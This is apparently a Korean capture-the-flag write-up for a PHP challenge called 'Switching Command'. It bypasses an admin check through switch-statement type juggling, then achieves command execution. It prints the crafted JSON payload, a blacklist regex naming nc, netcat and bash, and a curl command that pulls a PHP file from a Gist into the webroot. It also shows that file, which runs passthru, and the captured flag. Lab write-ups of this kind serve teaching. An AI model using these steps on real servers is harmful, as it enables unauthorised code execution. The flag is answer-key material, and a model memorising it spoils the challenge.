# S4 · Switching Command

### 1. VM에 접속한다


<p align="center"><img src="https://github.com/user-attachments/assets/1347d451-42ba-447e-a412-cdb8996f5b6b" width="850" alt="Switching Command 초기 화면" /></p>

### 2. 코드 분석 — PHP Type Juggling으로 관리자 인증 우회

**① `index.php`에서 비교 방식이 다른 점을 확인한다.**

```php
$data = json_decode($_POST["username"]);
$username = $data->username;

if ($username === "admin") {
    exit("no hack");
}

switch ($username) {
    case "admin":
        $user = "admin";
        $password = "***REDACTED***";
        $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
        $stmt->bind_param("ss", $user, $password);
        $stmt->execute();
        $result = $stmt->get_result();
        if ($result->num_rows == 1) {
            $_SESSION["auth"] = "admin";
            header("Location: test.php");
        }
        break;
    default:
        $_SESSION["auth"] = "guest";
        header("Location: test.php");
}
```

- `===`는 값과 자료형을 모두 비교하므로 Boolean `true`는 문자열 `"admin"`과 같지 않다.
- 반면 `switch`의 `case`는 느슨한 비교(`==`)를 사용한다. PHP 8에서 Boolean과 문자열을 비교할 때 문자열을 Boolean으로 변환하므로 `true == "admin"`은 참이다.

```php
(bool) "admin"  // true
(bool) ""       // false
(bool) "0"      // false
```

즉, `username`에 Boolean `true`를 넣으면 `if`의 차단 조건은 통과하고 `case "admin"` 분기로 진입한다. 이 분기에서는 서버 코드에 고정된 계정으로 DB를 조회해 결과가 1건이면 관리자 세션을 생성한다.

**② Burp Suite Repeater로 POST 요청을 전송한다.**

```http
POST /index.php HTTP/1.1
Host: <VM_주소:포트>
Content-Type: application/x-www-form-urlencoded

username=%7B%22username%22%3Atrue%7D
```

POST 본문의 값은 `username={"username":true}`를 URL 인코딩한 것이다. 서버는 `$_POST["username"]`을 `json_decode()`하여 Boolean `true`를 얻는다.

| Burp 요청 | 요청 후 응답 |
| :---: | :---: |
| <img src="https://github.com/user-attachments/assets/2568f599-f88b-471d-8e96-770ed111dd44" width="410" alt="Boolean true 입력 요청 화면" /> | <img src="https://github.com/user-attachments/assets/ff18c90e-bb59-4986-83fc-c881278efaf4" width="410" alt="관리자 세션 관련 응답 화면" /> |

```text
true === "admin" → false → 차단 통과
switch(true) → case "admin"과 일치
DB 조회 성공 → $_SESSION["auth"] = "admin"
```

응답에서 발급된 `PHPSESSID`는 이후 요청에서도 동일하게 사용한다. 단, **302 리다이렉트만으로 관리자 인증이 확정되지는 않는다.** Guest도 `test.php`로 이동하므로 관리자 전용 동작으로 확인한다.

### 3. 코드 분석 — `test.php`의 명령 실행

관리자 세션이면 URL의 `cmd` 파라미터로 받은 명령을 서버에서 실행한다.

```php
include("./config.php");
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if ($_SESSION["auth"] === "admin") {
    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n", "", $command);
    if (preg_match($pattern, $sanitized_command)) {
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}
```

- `config.php`의 `session_start()`로 세션을 유지한다.
- `preg_match()`는 `flag`, `bash`, `sh` 등의 단어를 차단한다.
- `escapeshellcmd()`가 일부 셸 특수문자를 이스케이프해도 허용된 명령은 `shell_exec()`로 실행된다.

**명령 실행 결과가 화면에 보이지 않는 이유**

```php
$resulttt = shell_exec(...);  // 실행 결과 저장
echo "<pre>$result</pre>";   // 실제 HTML에서 출력하는 변수
```

관리자 분기는 `$resulttt`에 저장하지만 HTML은 `$result`를 출력한다. 따라서 실행 결과가 표시되지 않는다.

### 4. Gist에서 `run.php` 생성 및 다운로드

**Gist는 GitHub에서 코드 파일을 공유하는 기능이며, `/flag` 명령을 `cmd`에 직접 넣지 않고 별도 PHP 파일로 내려받아 실행하기 위해 사용했다.**

**① [GitHub Gist](https://gist.github.com/)에 접속한다.**

<p align="center"><img src="https://github.com/user-attachments/assets/0592480c-ba25-4120-97c3-f6c8f7d94dc4" width="790" alt="GitHub Gist 접속 화면" /></p>

파일명을 `run.php`로 지정하고 아래 코드를 작성한다.

```php
<?php
passthru('/flag');
?>
```

`passthru()`는 운영체제 명령어를 실행하고 그 결과(stdout)를 별도 `echo` 없이 웹 응답에 출력하는 PHP 함수다. Dockerfile에서 `flag.c`를 컴파일해 `/flag` 실행 파일을 만들기 때문에, 이 파일은 텍스트로 읽는 것이 아니라 실행해야 한다.

**② Gist 파일을 생성하고 `Raw` 링크를 복사한다.**

| `run.php` 작성 | Gist 생성 완료 |
| :---: | :---: |
| <img src="https://github.com/user-attachments/assets/c002eed4-a00c-4518-93fc-44920adcede8" width="430" alt="Gist에 run.php 작성" /> | <img src="https://github.com/user-attachments/assets/297baed8-ca32-4256-89c8-04cc3206c4aa" width="430" alt="Gist 생성 완료 화면" /> |

<p align="center"><img src="https://github.com/user-attachments/assets/96f8802f-4d54-47bc-a48b-682b7623ba0b" width="750" alt="Gist Raw 링크 복사 화면" /></p>

**③ 관리자 세션을 유지하고 Burp Repeater로 다운로드 명령을 보낸다.**

```bash
curl -fsSL <GIST_RAW_URL> -o run.php
```

`-fsSL`은 오류 처리·출력 억제·리다이렉트 추적 옵션이고, `-o run.php`는 받은 파일을 `run.php`로 저장한다. 명령의 `cmd`에는 `/flag` 문자열이 없으므로, `test.php`의 블랙리스트는 다운로드된 PHP 파일 내부까지 검사하지 못한다.

```http
GET /test.php?cmd=curl%20-fsSL%20<URL_인코딩한_GIST_RAW_URL>%20-o%20run.php HTTP/1.1
Host: <VM_주소:포트>
Cookie: PHPSESSID=<관리자_세션_ID>
```

`GIST_RAW_URL`은 본인이 생성한 파일의 Raw 주소이며, 실제 HTTP 요청에서는 URL 인코딩해서 넣는다.

| Burp 설정 화면 ① | Burp 설정 화면 ② |
| :---: | :---: |
| <img src="https://github.com/user-attachments/assets/27d82cd4-118f-4a1f-80f3-ff04a31fc798" width="380" alt="Burp Repeater 명령 입력 화면 1" /> | <img src="https://github.com/user-attachments/assets/50b2183f-ce14-4ad3-b887-ab5c49e76e15" width="380" alt="Burp Repeater 명령 입력 화면 2" /> |

<p align="center"><img src="https://github.com/user-attachments/assets/11be12dc-84ec-4f06-b74d-f56313a6ea43" width="630" alt="run.php 다운로드 명령 전송 화면" /></p>

명령 결과가 비어 보일 수 있지만, 앞서 확인한 `$resulttt`와 `$result` 변수명 불일치 때문이다.

### 5. `run.php` 실행 후 FLAG 확인

서버의 웹 디렉터리에 다운로드된 `run.php`로 직접 접속한다.

```http
GET /run.php HTTP/1.1
Host: <VM_주소:포트>
```

```text
GET /run.php → PHP 코드 실행 → passthru('/flag')
→ /flag 실행 파일의 출력이 HTTP 응답에 나타남
```

<p align="center"><img src="https://github.com/user-attachments/assets/22aca2ff-9405-4104-b982-dca10c5f377f" width="610" alt="run.php 실행과 FLAG 출력 결과" /></p>

**확인한 FLAG**

```text
DH{3301f7d38317ccfa063c21e5a10e2b6b1f0489d0114d053f34805f44788341c2}
```

> **취약점 원인:** `index.php`에서 엄격 비교와 느슨한 비교를 혼용하여 관리자 인증을 우회할 수 있었다. 이후 `test.php`의 명령 실행 기능과 단순 블랙리스트를 이용해 별도 PHP 파일로 FLAG를 실행했다.
